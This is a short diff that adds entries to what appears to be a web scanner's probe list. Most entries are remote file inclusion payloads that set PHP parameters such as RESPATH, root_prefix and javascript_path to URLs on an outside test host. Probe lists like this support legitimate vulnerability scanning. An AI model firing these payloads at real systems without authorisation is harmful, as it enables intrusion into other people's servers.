@@ -1,0 +1,9 @@
+/dosearch.php?RESPATH=http://www.webscantest.com/pfi/x72xhax3
+/dosearch.php?RESPATH=http://webscantest.com/pfi/x72xhax3
+/dosearch.php?funky1
+/dosearch.php?funky2
+/dosearch.php?funky3?funky4
+/dosearch.php?funky3?funky4?funky5
+/download.php?root_prefix=http://www.webscantest.com/pfi/x72xhax4?
+/dp_logs.php?HomeDir=http://www.webscantest.com/pfi/x72xhax5
+/edit.php?javascript_path=http://www.webscantest.com/pfi/x72xhax6?
